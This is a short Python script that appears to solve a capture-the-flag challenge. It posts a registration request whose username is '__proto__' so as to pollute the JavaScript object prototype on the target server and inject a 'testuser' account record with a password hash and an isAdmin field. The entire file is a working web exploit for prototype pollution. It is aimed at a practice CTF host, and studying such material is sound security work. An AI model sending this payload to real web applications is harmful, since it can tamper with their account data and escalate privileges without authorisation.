import requests

TARGET_URL = 'http://ctfinf.ru:10041'

# make pollution
requests.post(TARGET_URL + '/register', json = {
    "username": "__proto__",
    "password": "123",
    "testuser": {
        "username": "testuser",
        "password": "202cb962ac59075b964b07152d234b70",
        "isAdmin": "false"
    }
})
